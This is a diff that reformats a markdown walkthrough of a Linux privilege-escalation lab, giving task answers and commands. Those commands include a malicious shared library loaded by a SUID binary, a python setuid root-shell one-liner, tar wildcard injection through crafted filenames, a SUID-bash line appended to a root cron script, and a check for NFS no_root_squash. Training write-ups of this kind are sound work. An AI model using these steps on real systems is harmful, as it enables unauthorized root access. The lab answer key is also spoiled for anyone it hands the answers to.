@@ -354,21 +354,19 @@ Creates a malicious `.so` that makes a SUID root bash shell.
 ### Step 3 — Compile
 ```bash
 ```
-`gcc -shared -fPIC -o /home/tcm/.config/libcalc.so /home/tcm/.config/libcalc.c`
 
 Compiles your malicious shared library.
 
 ### Step 4 — Execute SUID binary
 ```bash
+/usr/local/bin/suid-so
 ```
-`/usr/local/bin/suid-so`
-
 Loads the malicious `.so` as root.
 
 ### Answer:
 ```bash
+libcalc.so
 ```
-`libcalc.so`
 
 ---
 
@@ -376,31 +374,28 @@ Loads the malicious `.so` as root.
 
 ### Step 1 — Check nginx version
 ```bash
+nginx -v
 ```
-`nginx -v`
-
 Displays the currently running nginx version; used to check if vulnerable.
 
 ### Answer:
 ```bash
+CVE-2016-1247`
 ```
-`CVE-2016-1247`
-
 ---
 
 # ## TASK 13 — “What is the last line shown in the ‘strings’ output?”
 
 ### Step 1 — Run strings
 ```bash
+strings /usr/local/bin/suid-env
 ```
-`strings /usr/local/bin/suid-env`
-
 Shows the hardcoded commands inside the binary.
 
 ### Answer:
 ```bash
+service apache2 start
 ```
-`service apache2 start`
 
 ---
 
@@ -408,15 +403,15 @@ Shows the hardcoded commands inside the binary.
 
 ### Step 1 — Run strings
 ```bash
+strings /usr/local/bin/suid-env2
 ```
-`strings /usr/local/bin/suid-env2`
-
 Same idea as previous: look at embedded commands.
 
 ### Answer:
 ```bash
+/usr/sbin/service apache2 start
 ```
-`/usr/sbin/service apache2 start`
+
 
 ---
 
@@ -424,21 +419,19 @@ Same idea as previous: look at embedded commands.
 
 ### Step 1 — List capabilities
 ```bash
+getcap -r / 2>/dev/null
 ```
-`getcap -r / 2>/dev/null`
-
 Searches for binaries with special Linux capabilities (like setting UID).
 
 ### Answer:
 ```bash
+/usr/bin/python2.6
 ```
-`/usr/bin/python2.6`
 
 ### Exploit
 ```bash
+/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
-`/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
-
 Uses Python's ability to set UID to 0 (root) and run a shell.
 
 ---
@@ -447,15 +440,14 @@ Uses Python's ability to set UID to 0 (root) and run a shell.
 
 ### Step 1 — Check cron jobs
 ```bash
+cat /etc/crontab
 ```
-`cat /etc/crontab`
-
 Displays system-wide cron tasks executed by root.
 
 ### Answer:
 ```bash
+overwrite.sh
 ```
-`overwrite.sh`
 
 ---
 
@@ -463,36 +455,33 @@ Displays system-wide cron tasks executed by root.
 
 ### Wildcard exploit files
 ```bash
+`touch /home/tcm/--checkpoint=1
 ```
-`touch /home/tcm/--checkpoint=1`
-
 Creates a filename interpreted as an option by tar or rsync.
-```bash
-```
-`touch "/home/tcm/--checkpoint-action=exec=sh runme.sh"`
 
+```bash
+touch "/home/tcm/--checkpoint-action=exec=sh runme.sh"
+```
 Forces the cron job to execute your script.
 
 ### Answer:
 ```bash
+--checkpoint=1
 ```
-`--checkpoint=1`
-
 ---
 
 # ## TASK 18 — “What file did you modify to gain root?”
 
 ### Step 1 — Modify the cron script
 ```bash
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
 ```
-`echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh`
-
 Injects malicious code that runs as root during the cron job.
 
 ### Answer:
 ```bash
+/usr/local/bin/overwrite.sh
 ```
-`/usr/local/bin/overwrite.sh`
 
 ---
 
@@ -500,19 +489,17 @@ Injects malicious code that runs as root during the cron job.
 
 ### Step 1 — View NFS exports
 ```bash
+cat /etc/exports
 ```
-`cat /etc/exports`
-
 Displays exported directories and their permissions/options.
 
 ### Required exploit option:
 ```bash
 no_root_squash
 ```
-
 This allows remote root users to remain root on mounted shares.
 
 ### Answer:
 ```bash
-`no_root_squash`
+no_root_squash
 ```
